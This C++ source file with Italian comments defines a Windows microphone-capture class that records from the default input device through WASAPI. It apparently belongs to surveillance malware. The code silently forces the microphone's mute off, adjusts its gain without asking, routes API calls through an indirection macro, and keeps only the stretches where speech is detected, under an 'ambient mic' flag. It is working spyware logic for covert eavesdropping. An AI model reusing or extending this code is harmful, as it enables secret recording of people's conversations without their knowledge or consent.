#include <Windows.h>
#include <new>

#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#include "..\common.h"
#include "QVistaMicrophone.h"

QVistaMicrophone::QVistaMicrophone(BOOL bCalibration, UINT uThreshold, INT iSilence) : 
bSilence(FALSE), bVolume(FALSE), bVoice(FALSE), bMute(FALSE), bMicInitialization(FALSE),
uAudioBufferSize(0), uChannels(0), iSilenceBlock(0), pAudioBuffer(NULL), qsd(NULL),
pEnumerator(NULL), pDevice(NULL), pAudioClient(NULL), pAudio(NULL), pCaptureClient(NULL)
{
	bCalibrate = bCalibration;
	uChunkLen = 5;	// Manteniamo 5 secondi in RAM
	iSilenceLength = iSilence;	// Numero di blocchi di silenzio prima di fermare la registrazione
	fVoiceThreshold = (FLOAT)uThreshold / 1000.0f;		// Soglia di sensibilita' del filtro

	wfx.wFormatTag = WAVE_FORMAT_PCM;
	wfx.nSamplesPerSec = 44100;
	wfx.nChannels = 2;
	wfx.wBitsPerSample = 16;
	wfx.nBlockAlign = (wfx.nChannels * wfx.wBitsPerSample) / 8;
	wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
	wfx.cbSize = 0;

	FNC(GetSystemTime)(&st);

	hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	InitMic();
}

QVistaMicrophone::~QVistaMicrophone()
{
	if(pAudioBuffer != NULL){
		delete[] pAudioBuffer;
		pAudioBuffer = NULL;
		uAudioBufferSize = 0;
	}

	if(qsd){
		delete qsd;
		qsd = NULL;
	}

	SAFE_RELEASE(pEnumerator)
	SAFE_RELEASE(pDevice)
	SAFE_RELEASE(pAudioClient)
	SAFE_RELEASE(pAudio)
	SAFE_RELEASE(pCaptureClient)

	CoUninitialize();
}

UINT QVistaMicrophone::GetSampleRate()
{
	return wfx.nSamplesPerSec;
}

// Torna la dimensione del buffer allocato, va chiamata dopo l'AcquireMic()
UINT QVistaMicrophone::GetBufferSize()
{
	if(IsInitialized() == FALSE)
		return 0;

	return uAudioBufferSize;
}

BOOL QVistaMicrophone::AcquireMic(PBYTE* pBuffer)
{
	if(pBuffer == NULL)
		return FALSE;

	//if(hr != S_OK && hr != S_FALSE)
	//	return FALSE;

	if(pAudioBuffer){
		delete[] pAudioBuffer;
		pAudioBuffer = NULL;
		uAudioBufferSize = 0;
	}

	if(IsInitialized() == FALSE){
		if(InitMic() == FALSE)
			return FALSE;
	}

	if(AcquireMic() == FALSE)
		return FALSE;

	*pBuffer = pAudioBuffer;
	return TRUE;
}

BOOL QVistaMicrophone::AcquireMic()
{
	BOOL bDone = FALSE, bAppend = FALSE;
	UINT32 bufferFrameCount, numFramesAvailable, packetLength = 0, uTmp = 0;
	UINT uSleepTime, uSleepSlice;
	PBYTE pData = NULL, pTmp = NULL;
	DWORD flags, dwSleep = 0;
	REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
	REFERENCE_TIME hnsActualDuration;

	if(IsInitialized() == FALSE)
		return FALSE;

	CalibrateMic();

	// Get mute state
	hr = pAudio->GetMute(&bMute);
	EXIT_ON_ERROR(hr)

	if(bMute == TRUE){
		if(pAudioBuffer){
			delete[] pAudioBuffer;
			pAudioBuffer = NULL;
			uAudioBufferSize = 0;
		}

		return TRUE;
	}

	// Get the size of the allocated buffer.
	hr = pAudioClient->GetBufferSize(&bufferFrameCount);
	EXIT_ON_ERROR(hr)

	// Calculate the actual duration of the allocated buffer.
	hnsActualDuration = (REFERENCE_TIME)((double)(REFTIMES_PER_SEC) * bufferFrameCount / wfx.nSamplesPerSec);

	if(pAudioBuffer){
		delete[] pAudioBuffer;
		pAudioBuffer = NULL;
		uAudioBufferSize = 0;
	}

	// Calcoliamo il tempo effettivo che spendiamo nella sleep e nella copia
	// dei dati, in modo da riempire il piu' possibile il buffer
	uSleepTime = (UINT)(hnsActualDuration / REFTIMES_PER_MILLISEC);
	uSleepSlice = uSleepTime / 10;
	dwSleep = uSleepTime - (uSleepTime / 10); // Total sleep time - 10%
	dwSleep += FNC(GetTickCount)() - uSleepSlice;

	// Start recording.
	hr = pAudioClient->Start();
	EXIT_ON_ERROR(hr)

	while (dwSleep > FNC(GetTickCount)()) {
		// Sleep for 1/10th of the buffer duration.
		if (MiniSleep(uSleepSlice) == FALSE) {
			EXIT_ON_ERROR(-1)
		}

		hr = pCaptureClient->GetNextPacketSize(&packetLength);
		EXIT_ON_ERROR(hr)
		
		while(packetLength != 0){
			// Get the available data in the shared buffer.
			hr = pCaptureClient->GetBuffer(&pData, &numFramesAvailable, &flags, NULL, NULL);
			EXIT_ON_ERROR(hr)

			if(flags & AUDCLNT_BUFFERFLAGS_SILENT){
				pData = NULL;
				return TRUE;
			}

			// The size, in bytes, of an audio frame equals the number 
			// of channels in the stream multiplied by the sample size per channel. 
			// For example, for a stereo (2-channel) stream with 16-bit samples, the 
			// frame size is four bytes.
			if(pData){
				if(pAudioBuffer){ // Estendiamo il buffer
					uTmp = numFramesAvailable * (wfx.nChannels * wfx.wBitsPerSample / 8);

					pTmp = new(std::nothrow) BYTE[uAudioBufferSize + uTmp + 1];

					if(pTmp == NULL){
						delete[] pAudioBuffer;
						pAudioBuffer = NULL;
						uAudioBufferSize = 0;
						return FALSE;
					}

					memcpy(pTmp, pAudioBuffer, uAudioBufferSize);
					memcpy(pTmp + uAudioBufferSize, pData, uTmp);

					delete[] pAudioBuffer;
					pAudioBuffer = pTmp;
					uAudioBufferSize += uTmp;
					pTmp = NULL;
				}else{ // Allochiamo il buffer
					uAudioBufferSize = numFramesAvailable * (wfx.nChannels * wfx.wBitsPerSample / 8);
					pAudioBuffer = new(std::nothrow) BYTE[uAudioBufferSize + 1];

					if(pAudioBuffer == NULL){
						uAudioBufferSize = 0;
						return FALSE;
					}

					memcpy(pAudioBuffer, pData, uAudioBufferSize);
				}
			}

			hr = pCaptureClient->ReleaseBuffer(numFramesAvailable);
			EXIT_ON_ERROR(hr)

			hr = pCaptureClient->GetNextPacketSize(&packetLength);
			EXIT_ON_ERROR(hr)
		}
	}

	// Stop recording.
	hr = pAudioClient->Stop();

	if(qsd){
		qsd->SetBuffer(pAudioBuffer, uAudioBufferSize);
	}else{
		qsd = new QSpeechDetect(pAudioBuffer, wfx.nSamplesPerSec, wfx.wBitsPerSample, wfx.nChannels, uAudioBufferSize, fVoiceThreshold);
	}

	EXIT_ON_ERROR(hr)
	return TRUE;

Exit:
	if(pAudioBuffer){
		delete[] pAudioBuffer;
		pAudioBuffer = NULL;
		uAudioBufferSize = 0;
	}

	return FALSE;
}

BOOL QVistaMicrophone::InitMic()
{
	REFERENCE_TIME hnsRequestedDuration = REFTIMES_PER_SEC;
	WAVEFORMATEXTENSIBLE *wfxe = NULL;

	if(IsInitialized() == TRUE)
		return TRUE;

	if(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (LPVOID*)&pEnumerator) != S_OK)
		return FALSE;

	hr = pEnumerator->GetDefaultAudioEndpoint(eCapture, eConsole, &pDevice);
	EXIT_ON_ERROR(hr)

	hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
	EXIT_ON_ERROR(hr)

	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudio);
	EXIT_ON_ERROR(hr)

	hr = pAudio->GetChannelCount(&uChannels);
	EXIT_ON_ERROR(hr)

	hr = pAudio->GetVolumeRange(&fMin, &fMax, &fStep);
	EXIT_ON_ERROR(hr)

	hr = pAudioClient->IsFormatSupported(AUDCLNT_SHAREMODE_SHARED, &wfx, (WAVEFORMATEX **)&wfxe);
	if (wfxe)
		CoTaskMemFree(wfxe);
	EXIT_ON_ERROR(hr)

	hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, REFTIMES_PER_SEC * uChunkLen, 0, &wfx, NULL);
	if (FAILED(hr)) {
		wfx.nSamplesPerSec = 48000;
		wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
		hr = pAudioClient->Initialize(AUDCLNT_SHAREMODE_SHARED, 0, REFTIMES_PER_SEC * uChunkLen, 0, &wfx, NULL);
	}
	EXIT_ON_ERROR(hr)

	hr = pAudioClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCaptureClient); 
	EXIT_ON_ERROR(hr)

	bMicInitialization = TRUE;
	return bMicInitialization;

Exit:
	SAFE_RELEASE(pEnumerator)
	SAFE_RELEASE(pDevice)
	SAFE_RELEASE(pAudio)
	SAFE_RELEASE(pAudioClient)
	SAFE_RELEASE(pCaptureClient)
	bMicInitialization = FALSE;
	return bMicInitialization;
}

BOOL QVistaMicrophone::IsInitialized()
{
	return bMicInitialization;
}

BOOL QVistaMicrophone::MiniSleep(UINT uMilliSec)
{
	UINT uLoops;
	UINT uSleepTime = 300; // Step di 300ms

	if (bAmbientalMicSemaphore)
		return FALSE;

	if (uMilliSec <= uSleepTime){
		Sleep(uMilliSec);
		return TRUE;
	} else {
		uLoops = uMilliSec / uSleepTime;
	}

	while (uLoops) {
		Sleep(uSleepTime);
		uLoops--;

		if (bAmbientalMicSemaphore)
			return FALSE;
	}

	return TRUE;
}

BOOL QVistaMicrophone::CalibrateMic()
{
	HRESULT hr;
	UINT  i;
	FLOAT fLevel = 0.80f;

	if(bCalibrate == FALSE)
		return FALSE;

	if(IsInitialized() == FALSE){
		if(InitMic() == FALSE)
			return FALSE;
	}

	// Check paranoico
	if (!pAudio)
		return FALSE;

	// Set mute state to FALSE
	hr = pAudio->SetMute(FALSE, NULL);
	pAudio->GetMute(&bMute);

	// Torna FALSE se non riusciamo ad effettuare l'un-mute
	if(bMute == TRUE)
		return FALSE;

	if(uChannels == 0)
		return FALSE;

	// Normalizza all'80% tutti i canali in ingresso
	if(bVolume == FALSE){
		for(i = 0; i < uChannels; i++)
			pAudio->SetChannelVolumeLevelScalar(i, fLevel, NULL);
	}

	bVolume = TRUE; // Inizializzazione del volume completa
	return TRUE;
}

// Alza il guadagno del 10%
BOOL QVistaMicrophone::StepUp()
{
	FLOAT fLevel = 0.10f;
	UINT i;

	if(bCalibrate == FALSE)
		return FALSE;

	if(bMicInitialization == FALSE){
		if(InitMic() == FALSE)
			return FALSE;
	}

	// Set mute state to FALSE
	hr = pAudio->SetMute(FALSE, NULL);
	pAudio->GetMute(&bMute);

	// Torna FALSE se non riusciamo ad effettuare l'un-mute
	if(bMute == TRUE)
		return FALSE;

	if(uChannels == 0)
		return FALSE;

	for(i = 0; i < uChannels; i++){
		pAudio->GetChannelVolumeLevelScalar(i, &fLevel);
		pAudio->SetChannelVolumeLevelScalar(i, fLevel + 0.10f, NULL);
	}

	return TRUE;
}

// Abbassa il guadagano del 10%
BOOL QVistaMicrophone::StepDown()
{	
	FLOAT fLevel = 0.10f;
	UINT i;

	if(bCalibrate == FALSE)
		return FALSE;

	if(bMicInitialization == FALSE){
		if(InitMic() == FALSE)
			return FALSE;
	}

	// Set mute state to FALSE
	hr = pAudio->SetMute(FALSE, NULL);
	pAudio->GetMute(&bMute);

	// Torna FALSE se non riusciamo ad effettuare l'un-mute
	if(bMute == TRUE)
		return FALSE;

	if(uChannels == 0)
		return FALSE;

	for(i = 0; i < uChannels; i++){
		pAudio->GetChannelVolumeLevelScalar(i, &fLevel);
		pAudio->SetChannelVolumeLevelScalar(i, fLevel - 0.10f, NULL);
	}

	return TRUE;

}

// Se il campione acquisito contiene solo silenzio, cancella
// il buffer, setta la dimensione dei dati acquisiti a 0
// e setta bSilence a TRUE. Altrimenti setta bSilence a FALSE
// e lascia tutto invariato. Torna TRUE se il campione attuale
// e' di solo silenzio, FALSE altrimenti.
BOOL QVistaMicrophone::IsVoice()
{
	UINT uFrameSize, i, uClip = 0, uSilence = 0;
	SHORT sSample;
	FLOAT fSilence = 0.0f, fClip = 0.0f;

	uFrameSize = wfx.nChannels * wfx.wBitsPerSample / 8;

	if(uAudioBufferSize < uFrameSize){
		if(pAudioBuffer){
			delete[] pAudioBuffer;
			pAudioBuffer = NULL;
		}
		
		uAudioBufferSize = 0;
		iSilenceBlock++;
		return FALSE;
	}

	// Cicliamo un solo canale
	for(i = 0; i < uAudioBufferSize; i += 4){
		sSample = *((SHORT *)(&pAudioBuffer[i]));

		if(sSample >= (SHORT_MAX - CLIP_THRESHOLD) || sSample <= (SHORT_MIN + CLIP_THRESHOLD))
			fClip += 1.0f;
		else if(sSample  > -SILENCE_THRESHOLD && sSample < SILENCE_THRESHOLD)
			fSilence += 1.0f;
	}

	if(bCalibrate){
		// Aumentiamo di 1 per evitare una divisione per 0
		fClip += 1.0f;
		fSilence += 1.0f;

		if(fClip > fSilence){
			// Vediamo se c'e' clipping e se dobbiamo calibrare il microfono
			uClip = (UINT)((FLOAT)(fClip / (FLOAT)SAMPLES) * 10.0f);

			for(i = 0; i < uClip; i++)
				StepDown();
		}else{
			// Vediamo se il guadagno e' troppo basso e se dobbiamo calibrare il microfono
			uSilence = (UINT)((FLOAT)(fSilence / (FLOAT)SAMPLES) * 10.0f);

			for(i = 0; i < uSilence; i++)
				StepUp();
		}
	}

	if(qsd)
		bVoice = qsd->IsVoice();
	else
		bVoice = TRUE;	// Nel dubbio, c'e' voce

	// Aggiorna il timestamp se stiamo facendo una transizione da silenzio a voce
	if(bVoice && iSilenceBlock >= iSilenceLength){
		FNC(GetSystemTime)(&st);
	}

	if(bVoice)
		iSilenceBlock = 0;
	else
		iSilenceBlock++;

	return bVoice;
}

// Torna TRUE se i blocchi di silenzio sono maggiori del massimo silence time specificato
BOOL QVistaMicrophone::Silent()
{
	if(iSilenceLength == 0)
		return FALSE;

	if(iSilenceBlock >= iSilenceLength)
		return TRUE;

	return FALSE;
}

SYSTEMTIME QVistaMicrophone::GetTimeStamp()
{
	return st;
}